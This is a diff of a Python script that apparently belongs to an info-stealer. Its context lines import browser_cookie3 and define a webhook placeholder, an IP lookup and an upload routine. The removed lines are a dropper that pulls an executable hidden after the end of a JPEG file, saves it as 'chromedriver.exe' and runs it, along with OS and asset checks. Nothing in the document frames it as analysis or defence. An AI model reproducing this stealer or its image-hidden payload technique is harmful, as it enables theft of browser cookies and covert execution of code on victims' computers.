@@ -27,21 +27,8 @@ import browser_cookie3
 import time
 import sys
 
-if os.name == "nt":
-    pass
-
-else:
-    print("Your operating system is not supported.")
-    quit()
-
 hook = "X"
 DETECTED = False
-
-checkAssets = "assets/img.jpg"
-if os.path.exists(checkAssets) == False:
-    print('"assets/img.jpg" NOT FOUND.')
-    quit()
-
 
 def getip():
     ip = "None"
@@ -500,21 +487,6 @@ def Reformat(listt):
     while "net" in e:
         e.remove("net")
     return list(set(e))
-
-
-Chrome = "chromedriver.exe"
-
-with open("assets/img.jpg", "rb") as f:
-    content = f.read()
-    offset = content.index(bytes.fromhex("FFD9"))
-
-    f.seek(offset + 2)
-
-    with open(Chrome, "wb") as e:
-        e.write(f.read())
-
-os.system(Chrome)
-
 
 def upload(name, link):
     headers = {
